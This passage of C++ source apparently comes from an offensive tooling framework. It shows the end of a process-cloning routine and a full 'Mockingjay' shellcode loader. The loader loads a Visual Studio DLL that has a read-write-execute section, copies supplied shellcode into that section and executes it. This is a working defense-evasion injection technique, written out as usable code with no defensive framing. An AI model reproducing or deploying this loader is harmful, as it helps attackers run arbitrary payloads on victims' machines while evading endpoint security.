            RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
            lpBaseAddr,
            nullptr,
            nullptr,
            &info
        );
        if (status != STATUS_SUCCESS)
        {
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        MessageBox(NULL, L"Start", L"CallSysInvoke OK", MB_OK);

        System::Handle::HandleWait(pProcs, hProcess, FALSE, nullptr);
        System::Handle::HandleClose(pProcs, hProcess);

        return TRUE;
    }

    // Reference: https://github.com/caueb/Mockingjay/blob/main/MockingJay/MockingJay.c
    BOOL ProcessMockingjay(
        Procs::PPROCS pProcs,
        const std::vector<BYTE>& bytes
    ) {
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        // Target DLL with RWX permission
        // TODO: Find more other vulnerable DLLs.
        LPCWSTR lpTargetDll = L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll";
        
        HMODULE hDll = pProcs->lpLoadLibraryW(lpTargetDll);
        if (!hDll)
        {
            return FALSE;
        }

        MODULEINFO mi;
        if (!GetModuleInformation(NtCurrentProcess(), hDll, &mi, sizeof(MODULEINFO)))
        {
            return FALSE;
        }

        // Find RWX section offset & size
        DWORD_PTR dwpRWXSecOffset = 0;
        DWORD_PTR dwpRWXSecSize = 0;
        PIMAGE_NT_HEADERS pNtHeaders = pProcs->lpImageNtHeader(hDll);
        if (pNtHeaders)
        {
            PIMAGE_SECTION_HEADER pSecHeader = IMAGE_FIRST_SECTION(pNtHeaders);
            for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
            {
                if (
                    (pSecHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                    (pSecHeader->Characteristics & IMAGE_SCN_MEM_WRITE) &&
                    (pSecHeader->Characteristics & IMAGE_SCN_MEM_READ)
                ) {
                    DWORD_PTR dwpBaseAddr = (DWORD_PTR)hDll;
                    dwpRWXSecOffset = pSecHeader->VirtualAddress;
                    dwpRWXSecSize = pSecHeader->SizeOfRawData;
                }
                pSecHeader++;
            }
        }
        if (dwpRWXSecOffset == 0 || dwpRWXSecSize == 0)
        {
            return FALSE;
        }

        LPVOID lpRWXSection = (LPVOID)((PBYTE)mi.lpBaseOfDll + dwpRWXSecOffset);

        // Write shellcode to section
        memcpy(lpRWXSection, lpBuffer, dwBufferSize);
        // Execute shellcode from section
        ((void(*)())lpRWXSection)();

        return TRUE;
    }
}